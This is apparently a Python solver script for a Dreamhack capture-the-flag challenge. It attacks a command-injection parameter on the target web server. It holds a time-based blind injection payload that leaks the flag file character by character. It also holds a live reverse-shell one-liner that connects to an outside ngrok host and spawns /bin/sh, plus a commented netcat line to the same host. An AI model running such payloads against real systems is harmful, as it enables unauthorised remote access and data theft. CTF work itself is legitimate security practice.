import requests
import json
from Helpers import *
from Brute import *

TARGET_URL='http://host1.dreamhack.games:13481'

def checkChar(i,ch):
    payload = f"if [[ $(cat flag*|tr \"\n\" \" \"|cut -c {i+1}) == '{ch}' ]]; then sleep 5; fi"
    res = requests.head(f"{TARGET_URL}/?cmd={payload}")
    resTime = res.elapsed.total_seconds()
    if resTime > 5:
        return True
    else:
        return False

#print(checkChar(0,'b'))

def Main():
    options=Helpers.getOptions()
    options['checkChar']=checkChar
    options['len']=50
    options['flag']=''
    brute = Brute(**options)
    flag=brute.run(1)
    print(flag)

def command(cmd):
    res = requests.head(f"{TARGET_URL}/?cmd={cmd}")

command("python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"8.tcp.ngrok.io\",10674));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")
#command('which python|nc 8.tcp.ngrok.io 10674')